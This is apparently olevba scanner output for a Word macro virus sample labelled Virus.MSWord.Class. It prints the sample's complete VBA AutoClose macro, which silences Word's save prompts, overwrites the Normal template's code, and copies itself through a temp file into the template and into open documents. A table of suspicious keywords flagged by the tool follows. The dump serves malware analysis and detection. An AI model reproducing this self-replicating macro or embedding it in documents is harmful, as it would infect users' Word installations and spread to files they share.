olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.el-575871abafc10370218fdb2140dd5f027d6ca091
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.el-575871abafc10370218fdb2140dd5f027d6ca091 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
If Year(Now) = 2001 Then MsgBox "Welcome to the 21st Century", 0, "The True Begining"
name1 = "c:\windows\temp\" & Application.UserName & ".tmp"
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ActDoc = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
NormTemp = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If NormTemp = 79 Then GoTo out1
If NormTemp <> 79 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
        With host.codemodule
        For Countloop1 = 1 To 1000
        On Error GoTo Done1
        .deletelines 1
        Next Countloop1
Done1:
        End With
Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).Export name1
    host.codemodule.AddFromFile (name1)
    With host.codemodule
    For Countloop2 = 1 To 4
    .deletelines 1
    Next Countloop2
    .replaceline 1, "Sub AutoClose()"
    .replaceline 34, "host.codemodule.AddFromFile (" & Chr(34) & name1 & Chr(34) & ")"
     End With
  
End If
out1:
If ActDoc <> 79 Then
Set host = ActiveDocument.VBProject.VBComponents.Item(1)
host.codemodule.AddFromFile ("c:\windows\temp\Tester.tmp")
With host.codemodule
    For Countloop3 = 1 To 4
    .deletelines 1
    Next Countloop3
    
End With
End If
End Sub
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

